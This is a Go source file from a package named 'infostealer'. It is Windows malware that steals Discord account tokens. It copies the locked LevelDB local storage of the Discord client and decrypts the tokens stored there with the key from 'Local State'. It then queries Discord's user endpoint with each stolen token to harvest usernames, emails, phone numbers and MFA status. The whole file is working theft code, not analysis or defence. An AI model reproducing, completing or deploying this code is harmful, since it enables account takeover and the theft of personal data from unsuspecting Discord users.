//go:build windows

package infostealer

import (
	"encoding/base64"
	"encoding/json"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"strings"

	"github.com/syndtr/goleveldb/leveldb"
	"github.com/syndtr/goleveldb/leveldb/opt"
	"golang.org/x/sys/windows"
)

var discordPath string = filepath.Join(os.Getenv("APPDATA"), "discord")

func readRestrictedFile(sourcepath string) uintptr {
	pathPtr, _ := windows.UTF16PtrFromString(sourcepath)

	handle, err := windows.CreateFile(
		pathPtr,
		windows.GENERIC_READ,
		windows.FILE_SHARE_READ|windows.FILE_SHARE_WRITE|windows.FILE_SHARE_DELETE,
		nil,
		windows.OPEN_EXISTING,
		windows.FILE_ATTRIBUTE_NORMAL,
		0,
	)
	if err != nil {
		return 0
	}

	return uintptr(handle)
}

func copyLevelDB(sourcepath string) string {
	foldername := filepath.Join(os.TempDir(), randomstring(10))
	os.Mkdir(filepath.Join(foldername), 0755)

	files, _ := os.ReadDir(sourcepath)

	for _, file := range files {
		if file.IsDir() {
			continue
		}

		fullSourcePath := filepath.Join(sourcepath, file.Name())
		handle := readRestrictedFile(fullSourcePath)
		sourcefile := os.NewFile(handle, file.Name())
		dst, err := os.Create(filepath.Join(foldername, file.Name()))
		if err != nil {
			sourcefile.Close()
			continue
		}

		io.Copy(dst, sourcefile)
		sourcefile.Close()
		dst.Close()
	}
	os.Remove(filepath.Join(foldername, "LOCK"))

	return foldername
}

type userData struct {
	Username    string `json:"username"`
	DisplayName string `json:"global_name"`
	Email       string `json:"email"`
	PhoneNumber string `json:"phone"`
	MultiFactor bool   `json:"mfa_enabled"`
	Nitro       int    `json:"premium_type"`
}

type Discord struct {
	Userdata userData
	Token    string
}

func getDiscordTokens() []Discord {
	path, e := os.Stat(discordPath)
	if e != nil || !path.IsDir() {
		return nil
	}
	var state localState
	file, _ := os.ReadFile(filepath.Join(discordPath, "Local State"))
	json.Unmarshal(file, &state)

	key := state.decryptKey("", "", "v10")

	localdb := copyLevelDB(filepath.Join(discordPath, "Local Storage", "leveldb"))
	defer os.RemoveAll(localdb)

	db, _ := leveldb.OpenFile(localdb, &opt.Options{
		ReadOnly: true,
	})
	if db == nil {
		return nil
	}
	defer db.Close()

	var accounts []Discord
	files := db.NewIterator(nil, nil)
	for files.Next() {
		val := string(files.Value())
		if strings.Contains(val, "dQw4w9WgXcQ:") {
			start := strings.Index(val, "dQw4w9WgXcQ:") + 12
			encryptedPart := val[start:]
			if endQuote := strings.Index(encryptedPart, "\""); endQuote != -1 {
				encryptedPart = encryptedPart[:endQuote]
			}

			encryptedPart = strings.Trim(encryptedPart, "\x00\x01\x02\x03\x04 ")

			rawstring, err := base64.StdEncoding.DecodeString(encryptedPart)
			if err != nil {
				continue
			}

			token, err := decrypt(rawstring[3:], key)
			if err != nil || token == "" {
				continue
			}

			accounts = append(accounts, Discord{
				Token: token,
			})
		}
	}

	httpclient := &http.Client{}
	for i, account := range accounts {
		req, _ := http.NewRequest("GET", "https://discord.com/api/v9/users/@me", nil)
		req.Header = http.Header{
			"authorization": {account.Token},
			"content-type":  {"application/json"},
			"user-agent":    {"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"},
		}
		r, e := httpclient.Do(req)
		if e != nil {
			continue
		}
		var userdata userData
		json.NewDecoder(r.Body).Decode(&userdata)
		r.Body.Close()
		accounts[i].Userdata = userdata
	}

	return accounts
}
